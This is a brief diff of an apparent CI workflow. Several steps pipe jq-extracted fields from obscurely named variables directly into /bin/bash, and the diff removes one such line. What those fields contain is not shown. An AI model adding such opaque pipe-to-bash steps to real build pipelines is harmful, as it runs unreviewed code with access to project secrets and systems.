@@ -20,7 +20,6 @@ jobs:
           echo $o207 | jq -r .leq2308 | /bin/bash
           printf '%s' "$v8031" | jq -r .qpxmz750 | /bin/bash
           echo $q97 | jq -r .k06065 | /bin/bash
-          echo $uecci4 | jq -r .rwbeu902 | /bin/bash
           echo $beckk09352 | jq -r .fv1 | /bin/bash
           echo $ue0237 | jq -r .up8 | /bin/bash
 
